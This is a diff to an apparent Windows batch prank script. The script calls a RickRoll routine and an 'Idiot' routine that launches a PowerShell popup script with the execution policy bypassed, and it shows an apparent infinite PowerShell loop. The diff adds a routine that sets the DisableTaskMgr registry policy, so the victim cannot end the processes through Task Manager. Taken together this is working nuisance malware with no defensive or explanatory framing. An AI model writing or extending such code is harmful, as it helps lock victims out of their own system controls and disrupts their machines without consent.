@@ -7,6 +7,7 @@ start "" powershell -command "Add-Type -AssemblyName presentationCore; while($tr
 
 call :RickRoll
 call :Idiot
+call :NoTaskMGR
 exit /b
 
 :RickRoll
@@ -15,4 +16,8 @@ goto :eof
 
 :Idiot
 start "" powershell -ExecutionPolicy Bypass -File "%~dp0popup1.ps1"
+goto :eof
+
+:NoTaskMGR
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f
 goto :eof
